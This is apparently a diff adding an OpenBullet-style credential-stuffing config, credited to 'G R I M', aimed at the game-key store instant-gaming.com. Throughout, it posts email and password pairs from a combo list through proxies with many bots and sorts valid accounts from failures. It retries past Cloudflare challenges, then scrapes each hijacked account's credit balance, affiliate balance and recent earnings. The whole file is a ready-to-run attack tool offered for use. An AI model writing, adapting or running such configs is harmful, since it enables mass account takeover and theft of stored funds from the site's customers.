@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "Instant-gaming.com",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-29T22:30:56.3674654-04:00",
+  "AdditionalInfo": "",
+  "Author": "G R I M",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.instant-gaming.com/en/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "usid\" value=\"" "\" />" -> VAR "Token" 
+
+#Login REQUEST POST "https://www.instant-gaming.com/en/" 
+  CONTENT "email=<USER>&password=<PASS>&usid=<Token>&process=login&ajax=true&pluginsdata=Chrome+PDF+Plugin%3A%3APortable+Document+Format%3A%3Aapplication%2Fx-google-chrome-pdf~pdf%3BChrome+PDF+Viewer%3A%3A%3A%3Aapplication%2Fpdf~pdf%3BNative+Client%3A%3A%3A%3Aapplication%2Fx-nacl~%2Capplication%2Fx-pnacl~" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.instant-gaming.com" 
+  HEADER "referer: https://www.instant-gaming.com/en/" 
+
+#Pass/Fail KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"ok\":true,\"user_id" 
+  KEYCHAIN Failure OR 
+    KEY "{\"ok\":false,\"error\":\"Invalid email or password.\"}" 
+    KEY "{\"ok\":false,\"error\":\"Your account has been deactivated. Please contact support@instant-gaming.com\"}" 
+  KEYCHAIN Retry OR 
+    KEY "{\"ok\":false,\"error\":\"You have reached the maximum number of active sessions for your account.\"}" 
+    KEY "<title>Attention Required! | Cloudflare</title>" 
+
+REQUEST GET "https://www.instant-gaming.com/en/my-credits/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CloudFlare_check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "<title>Attention Required! | Cloudflare</title>" 
+
+#Credits_capture PARSE "<SOURCE>" LR "<div class=\"ig-ewallet-huge-amount\"><strong class=\"generic-ewallet-amount\">" "</strong>" -> CAP "Credit Balance" "$" "" 
+
+REQUEST GET "https://www.instant-gaming.com/en/affiliate/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CloudFlare_Check_2 KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "<title>Attention Required! | Cloudflare</title>" 
+
+#Affiliate_Earnings PARSE "<SOURCE>" LR "<div class=\"ig-affiliate-wallet ig-affiliate-wallet1\"><span>" "$</span>Affiliate credit balance" -> CAP "Affiliate Credit Balance" "$" "" 
+
+#Pending_Pre-Order_Earnings PARSE "<SOURCE>" LR "<div class=\"ig-affiliate-wallet ig-affiliate-wallet2\"><span>" "</span>Pending Pre-orders **" -> CAP "Pending Pre-Order Earnings" 
+
+#Total_Earnings_-_30_Days PARSE "<SOURCE>" LR "gaming.com/en/my-credits/\">" "</a></span></span>Total earnings in last 30 days</div>" -> CAP "Total earnings in last 30 days" "$" "" 
+
